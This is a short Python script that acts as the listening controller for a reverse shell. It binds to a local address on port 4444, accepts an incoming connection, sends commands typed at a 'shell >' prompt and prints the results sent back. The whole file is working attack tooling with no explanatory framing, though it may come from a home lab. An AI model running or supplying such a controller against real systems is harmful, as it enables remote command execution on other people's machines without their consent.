import socket

def connect():
    s = socket.socket()
    s.bind(( "192.168.1.24", 4444))
    s.listen(1)
    connect, address = s.accept()

    while True:
        command = input("shell >")

        if 'exit' in command:
            connect.send('exit'.encode())
            connect.close()
            break
        else:
            connect.send(command.encode())
            print(connect.recv(1024).decode())


def main():
    connect()

main()